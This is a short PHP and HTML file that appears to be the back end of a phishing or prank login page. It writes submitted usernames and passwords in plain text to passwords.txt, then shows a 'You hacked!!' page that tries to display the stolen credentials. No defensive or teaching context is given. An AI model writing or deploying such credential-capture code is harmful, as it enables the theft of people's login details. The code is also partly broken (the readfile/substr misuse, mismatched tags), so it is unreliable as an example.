<?php
$myfile = fopen("passwords.txt", "w") or die("Unable to open file!");
$txt = "username: " . $_POST['userLogin'] . "\n";
$txt .= "password: " . $_POST['password'] . " \n";;
fwrite($myfile, $txt);
fclose($myfile);
?>






<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <link rel="stylesheet" href="bootstrap.min.css">



    </head>
    <body style="height: 100hv" class="bg-light" >
        <header>
            <nav class="navbar bg-dark navbar-dark navbar-expand-sm ">
                <div class="container"> 
                    <div class="navbar-brand">
                        <span></span>
                    </div>

                    <div class="navbar-nav text-white ">
                    </div>
                </div>
            </nav>
        </header>
        <!--        <script>
                    $(function() {
                        $('[data-toggle="tooltip"]').tooltip({});
                    });
                    </script>-->



        <main class="text-center">
            <div class="border border-dark">
                <h1>You hacked!!</div>
            <h4><?php echo substr(readfile("passwords.txt") ,0 ,-3); ?></h4>
            <h3>Do not take it personally</h3>
        </div>


    </main>


    <footer>
        <!--<p>footer</p>-->
    </footer>

</body>

</html>

